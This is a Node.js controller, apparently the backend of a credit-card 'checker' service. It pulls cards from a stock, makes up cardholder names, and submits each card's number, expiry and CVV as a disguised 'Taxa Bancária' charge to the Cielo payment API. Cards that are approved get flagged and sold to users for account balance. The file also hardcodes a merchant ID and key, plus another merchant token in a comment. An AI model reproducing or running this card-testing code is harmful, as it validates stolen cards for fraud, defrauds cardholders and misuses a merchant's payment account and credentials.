const Product = require("../models/Product");
const Purchase = require("../models/Purchase");
const User = require("../models/User");
var convert = require("xml-js");
const axios = require("axios");

class TesteController {
	async test(req, res) {
		req.connection.setTimeout(600 * 100 * 1000);

		const user = await User.findById(req.userId);
		const { ammount } = req.body;

		if (!user) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		if (user.balance < ammount) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		if (user.testando) {
			return res.status(400).json({
				message:
					"Já existe um teste sendo executado na sua conta, por favor aguarde alguns minutos e tente novamente."
			});
		} else {
			await User.findByIdAndUpdate(user._id, { testando: true }).then(
				async () => {
					await this.efetuaTeste(user, null, ammount, 0, 200)
						.then(async result => {
							await User.findByIdAndUpdate(user._id, {
								testando: false
							});
							switch (result) {
								case 200: {
									return res.json({
										message:
											"Teste finalizado com sucesso !"
									});
								}
								case 500: {
									return res.status(400).json({
										message:
											"Teste finalizado por falta de cartão no estoque."
									});
								}
							}
						})
						.catch(async err => {
							await User.findByIdAndUpdate(user._id, {
								testando: false
							});

							console.log(err);
							return res.status(400).json({
								message:
									"Ouve um problema durante os teste, desculpe... Mas fique tranquilo voce pode começar de novo, e suas cc aprovadas não foram perdidas, elas ja estão na sua lista!."
							});
						});
				}
			);
		}
	}

	async efetuaTeste(user, ccNumber, ammount, qtd, code) {
		console.log(`Quantidade: ${qtd} - Total: ${ammount}`);

		if (qtd == ammount) {
			return code;
		}

		const totalCC = await Product.countDocuments({
			status: "Disponivel",
			number: { $ne: ccNumber }
		});

		const randomNumber = Math.floor(Math.random() * totalCC);
		var data = await Product.find({
			status: "Disponivel",
			number: { $ne: ccNumber }
		})
			.limit(1)
			.skip(randomNumber);

		if (data.length === 0) {
			return 500;
		}

		const cc = data[0];
		// const cieloData = {
		// 	token:
		// 		"89c9bf2cedfcec614a4454284c1f51c36c961d7e5b6dc346efeee2ba13c9401c",
		// 	number: "1015074666"
		// };

		// const postData = `
		// 	<?xml version="1.0" encoding="ISO-8859-1"?>
		// 	<requisicao-transacao id="a97ab62a-7956-41ea-b03f-c2e9f612c293" versao="1.2.1">
		// 	<dados-ec>
		// 		<numero>${cieloData.number}</numero>
		// 		<chave>${cieloData.token}</chave>
		// 	</dados-ec>
		// 	<dados-portador>
		// 		<numero>${cc.number}</numero>
		// 		<validade>${cc.year}${cc.month}</validade>
		// 		<indicador>1</indicador>
		// 		<codigo-seguranca>${cc.cvv}</codigo-seguranca>
		// 	</dados-portador>
		// 	<dados-pedido>
		// 		<numero>178148599</numero>
		// 		<valor>1000</valor>
		// 		<moeda>986</moeda>
		// 		<data-hora>2019-12-07T11:43:37</data-hora>
		// 		<descricao>[origem:10.50.54.156]</descricao>
		// 		<idioma>PT</idioma>
		// 		<soft-descriptor/>
		// 		<numero-bilhete>123456</numero-bilhete>
		// 	</dados-pedido>
		// 	<forma-pagamento>
		// 		<bandeira>${cc.flag}</bandeira>
		// 		<produto>1</produto>
		// 		<parcelas>1</parcelas>
		// 	</forma-pagamento>
		// 	<url-retorno>http://localhost/lojaexemplo/retorno.jsp</url-retorno>
		// 	<autorizar>3</autorizar>
		// 	<capturar>false</capturar>
		// 	</requisicao-transacao>
		// `;

		// const resultTest = await axios({
		// 	method: "post",
		// 	url: "https://ecommerce.cielo.com.br/servicos/ecommwsec.do",
		// 	headers: { "Content-Type": "text/xml" },
		// 	data: postData
		// }).catch(async () => {
		// 	code = 500;
		// 	code = await this.efetuaTeste(user, cc.number, ammount, qtd, code);
		// 	return code;
		// });

		const firstNames = [
			"Vinicius",
			"Talita",
			"Maria",
			"João",
			"José",
			"Marcos"
		];

		const middleNames = [
			"Costa",
			"Araújo",
			"Rodrigues",
			"Pereira",
			"Soares"
		];

		const lastNames = ["Pires", "Alves", "Álvares", "Moreira", "Ferreira"];

		const postData = {
			MerchantOrderId: `${Math.floor(
				Math.random() * (2914111704 - 2000000000 + 1)
			) + 2000000000}`,
			Customer: {
				Name: "Taxa Bancária"
			},
			Payment: {
				Type: "CreditCard",
				Amount: Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000,
				Installments: 1,
				SoftDescriptor: `Bank${Math.floor(
					Math.random() * (2914 - 2001 + 1)
				) + 2001}`,
				CreditCard: {
					CardNumber: cc.number,
					Holder: `${
						firstNames[
							Math.floor(
								Math.random() * (firstNames.length - 0 + 1)
							) + 0
						]
					} ${
						middleNames[
							Math.floor(
								Math.random() * (middleNames.length - 0 + 1)
							) + 0
						]
					} ${
						lastNames[
							Math.floor(
								Math.random() * (lastNames.length - 0 + 1)
							) + 0
						]
					}`,
					ExpirationDate: `${cc.month}/${cc.year}`,
					SecurityCode: cc.cvv,
					Brand: cc.flag
				},
				IsCryptoCurrencyNegotiation: false
			}
		};

		const resultTest = await axios
			.post("https://api.cieloecommerce.cielo.com.br/1/sales", postData, {
				headers: {
					MerchantId: "c0e492a2-e66e-491e-941b-4093bec666ef",
					MerchantKey: "HJtj7hadlInuKfrQ3ZIJP4dT3ARzTiI5pYn1pzkL"
				}
			})
			.catch(async err => {
				console.log(err.response.data);
				code = 500;
				code = await this.efetuaTeste(
					user,
					cc.number,
					ammount,
					qtd,
					code
				);
				return code;
			});

		// const resultJson = JSON.parse(
		// 	convert.xml2json(resultTest.data, {
		// 		compact: true,
		// 		spaces: 4
		// 	})
		// );

		// var result = resultJson.transacao.autorizacao.mensagem._text;
		var result = resultTest.data.Payment.ReturnMessage;

		result = result.trim();

		console.log(result);

		switch (result) {
			case "Transacao autorizada": {
				const userBalanceAtual = await User.findById(user._id);

				if (userBalanceAtual.balance > 0) {
					await User.update(
						{ _id: user.id },
						{
							$inc: { balance: -1 }
						}
					);

					await Product.findByIdAndUpdate(cc.id, {
						status: "Aprovada",
						usedBy: user.id,
						usedDate: Date.now()
					}).then(async () => {
						code = 200;
						qtd = qtd + 1;
						code = await this.efetuaTeste(
							user,
							cc.number,
							ammount,
							qtd,
							code
						);
						return code;
					});
				}

				break;
			}

			case "Autorizacao negada": {
				await Product.findByIdAndUpdate(cc.id, {
					status: "Recusada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(async () => {
					code = 500;
					code = await this.efetuaTeste(
						user,
						cc.number,
						ammount,
						qtd,
						code
					);
					return code;
				});

				break;
			}
		}

		return code;
	}
}

module.exports = new TesteController();
